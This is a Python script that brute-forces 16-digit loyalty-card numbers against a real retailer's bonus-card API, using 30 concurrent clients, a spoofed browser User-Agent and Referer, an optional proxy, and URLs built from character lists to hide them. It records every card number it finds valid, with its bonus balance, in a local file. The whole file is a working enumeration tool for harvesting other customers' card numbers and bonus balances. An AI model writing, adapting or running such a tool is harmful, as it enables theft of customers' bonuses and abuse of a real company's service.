#! /usr/bin/env python
# -*- coding: utf-8 -*-
import random
import time
import math
import string
import asyncio
from collections import deque, Counter
from itertools import product
import logging
from concurrent.futures._base import TimeoutError

import aiohttp
import aiofiles
import async_timeout

SOURCE_PARSED = 'data/parsed.txt'
SOURCE_ACTIVE = 'data/active.txt'

# mooore security =)
USER_AGENT = ''.join(['M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w',
                      's', ' ', 'N', 'T', ' ', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x',
                      '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7',
                      '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e',
                      'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '6', '1', '.', '0', '.', '3', '1',
                      '6', '3', '.', '1', '0', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3',
                      '6'])
REFERER = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', '.', 'd', 'e', 't', 'm', 'i', 'r', '.', 'r', 'u',
                   '/', 'c', 'a', 'r', 't'])
URL = ''.join(['h', 't', 't', 'p', 's', ':', '/', '/', 'a', 'p', 'i', '.', 'g', 'o', '.', 'd', 'e', 't', 'm', 'i', 'r',
               '.', 'r', 'u', '/', 'v', '1', '/', 'b', 'o', 'n', 'u', 's', '-', 'c', 'a', 'r', 'd', 's', '?', 'f', 'i',
               'l', 't', 'e', 'r', '=', 'n', 'u', 'm', 'b', 'e', 'r', ':', '%s'])
PROXY = None
TIMEOUT = 25


CODE_PREFIX = ''
CODE_CHARS = string.digits
CODE_LEN = 16

CODES_PER_TASK_MAX = 20
CODES_PER_SESSION_LIMIT = 500000
CODES_BUFFER_LIMIT = 1000
MAX_CLIENTS = 30

DEBUG = False

try:
    from config_local import *
except ImportError:
    pass


assert MAX_CLIENTS


class Storage(object):

    active_asyncfile = None
    parsed_asyncfile = None

    codes_queue = deque()

    codes_buffer_active = []
    codes_buffer_parsed = []
    sem = asyncio.Semaphore(1)

    stats = Counter(bonus_summary=0, bonus_max=0)

    @classmethod
    async def create(cls):
        instance = cls()
        await instance.init_fs()
        instance.generate_codes(CODE_PREFIX)
        return instance

    def generate_codes(self, prefix):
        with open(SOURCE_PARSED, 'r') as parsed_f:
            already_parsed = set(map(lambda i: i.strip(), parsed_f.readlines()))
            combination_len = CODE_LEN - len(prefix)
            logging.info('Generate code by len %s' % combination_len)
            chars = list(CODE_CHARS)
            random.shuffle(chars)
            for combination in product(''.join(chars), repeat=combination_len):
                code = '%s%s' % (prefix, ''.join(combination))
                logging.debug('check code %s', code)

                if code not in already_parsed:
                    self.codes_queue.append(code)
                else:
                    logging.debug('already parsed')

                if len(self.codes_queue) >= CODES_PER_SESSION_LIMIT:
                    break

            logging.info('Gen %d codes' % len(self.codes_queue))

    async def init_fs(self):
        # use mmap if need more speed
        self.parsed_asyncfile = await aiofiles.open(SOURCE_PARSED, 'a+')
        self.active_asyncfile = await aiofiles.open(SOURCE_ACTIVE, 'a+')

    def get_code_for_check(self):
        return self.codes_queue.pop()

    async def save_parsed_code(self, code: str, valid: bool, bonus_value: float):
        if valid:
            self.codes_buffer_active.append((code, bonus_value))
        self.codes_buffer_parsed.append(code)

        if len(self.codes_buffer_parsed) >= CODES_BUFFER_LIMIT:
            await self.flush_buffers()

    async def flush_buffers(self):
        async with self.sem:
            if self.codes_buffer_active:
                logging.info('flush buffer active')
                s = ''.join(['%s;%s\n' % i for i in self.codes_buffer_active])
                max_bonus = max(list(map(lambda x: x[1], self.codes_buffer_active)))
                await self.active_asyncfile.write(s)
                self.stats['active'] += len(self.codes_buffer_active)
                self.stats['bonus_summary'] += sum(map(lambda x: x[1], self.codes_buffer_active))
                self.stats['bonus_max'] = max((self.stats['bonus_max'], max_bonus))
                self.codes_buffer_active = []

            if self.codes_buffer_parsed:
                logging.info('flush buffer parsed')
                await self.parsed_asyncfile.write(''.join(['%s\n' % code for code in self.codes_buffer_parsed]))
                self.stats['parsed'] += len(self.codes_buffer_parsed)
                self.codes_buffer_parsed = []

            logging.info('codes left %d', len(self.codes_queue))


async def parsing(session, code, pid, storage):
    start = time.time()
    async with session.get(URL % code, headers={'User-Agent': USER_AGENT, 'Referer': REFERER}, proxy=PROXY) as resp:
        response_json = await resp.json()
        logging.debug('Process {}: {} {}, took: {:.2f} seconds'.format(pid, code, response_json, time.time() - start))
        is_valid = len(response_json) and response_json[0]['number'] == code
        bonus_value = 0. if not is_valid else response_json[0]['active_bonus']
        logging.debug('save code %s %s %s' % (code, int(is_valid), bonus_value))
        await storage.save_parsed_code(code, is_valid, float(bonus_value))


async def task(pid, storage: Storage, sem: asyncio.Semaphore):
    async with sem:
        logging.debug('Task {} started'.format(pid))
        for i in range(CODES_PER_TASK_MAX):
            try:
                code = storage.get_code_for_check()
            except IndexError:
                return
            else:
                async with aiohttp.ClientSession() as session:
                    try:
                        async with async_timeout.timeout(TIMEOUT):
                            await parsing(session, code, pid, storage)
                    except BaseException as e:
                        logging.warning('Exception %s %s' % (type(e), str(e)))
                        storage.stats['fail'] += 1
                        if isinstance(e, TimeoutError):
                            await asyncio.sleep(TIMEOUT)


async def run():
    storage = await Storage.create()
    sem = asyncio.Semaphore(MAX_CLIENTS)
    task_count = math.ceil(len(storage.codes_queue) / CODES_PER_TASK_MAX)
    logging.info('Create %d tasks' % task_count)
    if not task_count:
        return

    start_time = time.time()
    # noinspection PyTypeChecker
    tasks = [asyncio.ensure_future(task(i, storage, sem)) for i in range(task_count)]
    await asyncio.wait(tasks)
    await storage.flush_buffers()
    end_time_in_sec = time.time() - start_time

    logging.info("Process took: %.2f seconds (%.2f req/sec)" % (end_time_in_sec,
                                                                storage.stats['parsed'] / end_time_in_sec))
    logging.info('Result: %s' % storage.stats.items())


if __name__ == '__main__':
    logging.basicConfig(
        format='%(asctime)s %(levelname)s:%(message)s',
        level=logging.DEBUG if DEBUG else logging.INFO)
    logging.info('Start %s clients per %s codes max:' % (MAX_CLIENTS, CODES_PER_TASK_MAX))
    ioloop = asyncio.get_event_loop()
    ioloop.run_until_complete(run())
    ioloop.close()
